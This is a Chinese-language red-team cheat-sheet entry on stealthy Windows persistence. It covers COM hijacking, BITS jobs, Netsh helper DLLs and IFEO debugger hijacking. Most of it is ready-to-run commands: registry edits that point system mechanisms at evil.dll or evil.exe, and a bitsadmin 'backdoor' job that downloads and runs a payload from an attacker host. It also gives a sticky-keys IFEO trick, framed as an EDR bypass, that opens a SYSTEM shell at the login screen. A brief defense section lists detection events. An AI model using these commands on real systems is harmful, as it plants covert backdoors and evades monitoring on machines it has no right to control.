...
### COM劫持 / BITS / Netsh Helper / IFEO 持久化  `persistence-com-bits-netsh-ifeo`
_COM 劫持、BITS 任务、Netsh Helper DLL、映像劫持(IFEO) 四类隐蔽持久化_
子类：**持久化** · tags: `com-hijack` `bits` `netsh-helper` `ifeo` `persistence` `windows`

**前置条件：**
- 管理员权限（HKLM 级）或用户权限（HKCU 级 COM 劫持）
- 目标机可写入 DLL/脚本

**攻击链：**

**① COM 劫持（InprocServer32 替换）**
> 劫持常见 COM 对象（如任务计划/资源管理器调用）的 InprocServer32 指向恶意 DLL
_platform: windows_
```
# HKCU 级（用户权限即可，最隐蔽）
...
# HKLM 级（管理员权限）
reg add "HKLM\Software\Classes\CLSID\{<GUID>}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\evil.dll" /f
# 常用目标 CLSID 示例：{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}（ShellLink 等被频繁调用的对象）
```
**语法解析：**
- `CLSID\{<GUID>}\InprocServer32` — COM 对象默认 DLL 加载路径 _value_
- 替换后任何程序实例化该 COM 对象即加载恶意 DLL _value_

**② BITS 任务持久化**
> 用 BITSAdmin 创建后台传输任务，指向恶意文件并定时/触发执行
_platform: windows_
```
bitsadmin /create /download backdoor
bitsadmin /addfile backdoor http://attacker/payload.exe C:\Users\Public\payload.exe
bitsadmin /SetNotifyCmdLine backdoor "C:\Users\Public\payload.exe" ""
bitsadmin /resume backdoor
# 或用 PowerShell Start-BitsTransfer 计划任务搭配实现定期重下
```

**③ Netsh Helper DLL**
> 注册自定义 netsh helper DLL，netsh 启动即加载
_platform: windows_
```
# 先写恶意 DLL 到系统目录（需管理员）
# 再注册为 netsh helper
reg add "HKLM\SOFTWARE\Microsoft\NetSh" /v "evil" /t REG_SZ /d "C:\Windows\System32\evil.dll" /f
# netsh 每次启动会加载该 helper，触发恶意 DLL
```

**④ IFEO 映像劫持（调试器替换）**
> 把目标进程的 Debugger 指向恶意程序，目标进程启动时被劫持
_platform: windows_
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<合法进程>.exe" /v Debugger /t REG_SZ /d "C:\Users\Public\evil.exe" /f
# 例：劫持 sethc.exe（粘滞键）→ 登录界面连按 Shift 触发恶意程序
```
**语法解析：**
- `Image File Execution Options\<进程>.exe` — 映像劫持注册表键 _value_
- `Debugger` — 指定进程启动时改调用的程序 _value_

**EDR 绕过变体：**
> 用合法签名的 COM 对象 + 延迟加载降低特征；IFEO 劫持系统自带进程（sethc/osk）免额外落地
_platform: windows_
```
# 组合技：IFEO 劫持 sethc.exe（无落地恶意 exe，直接调 cmd）
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
# 登录界面连按 5 次 Shift → 弹出 SYSTEM 权限 cmd（粘滞键后门）
```

**输出解读**：四类均通过「注册表/任务对象」持久化，重启或进程启动即触发；COM 劫持与 IFEO 最隐蔽（无独立进程驻留），BITS 有网络下载特征，Netsh Helper 有 DLL 落地特征。

**证据要求**：持久化类型 + 落点（CLSID/任务名/注册表键/被劫持进程）+ 触发方式 + 生效验证 + 手动排除步骤（写进 persistence-registry）。

**概述：** 传统持久化（Run 键/服务/计划任务）易被查；COM 劫持、IFEO 映像劫持、BITS 任务、Netsh Helper DLL 利用系统合法机制，特征更弱、存活更久，是红队隐蔽持久化的四件套。

**漏洞原理：** Windows 的 COM 加载、进程调试器、netsh 插件、BITS 任务机制均「信任注册表/配置指向的路径」，攻击者改写指向即获执行。

**利用方法：** 1) 选隐蔽机制 2) 落地 DLL/exe 3) 写注册表/任务指向 4) 触发（重启/实例化/进程启动）5) 验证生效并登记排除步骤。

**防御措施：** 1) Sysmon Event 13（注册表 CLSID/IFEO/Debugger 修改）+ Event 4657 2) 监控 BITS 任务创建（Event 7036/7045）3) 白名单化 netsh helper 与 COM InprocServer32 路径 4) AppLocker 限制 DLL 落地目录。
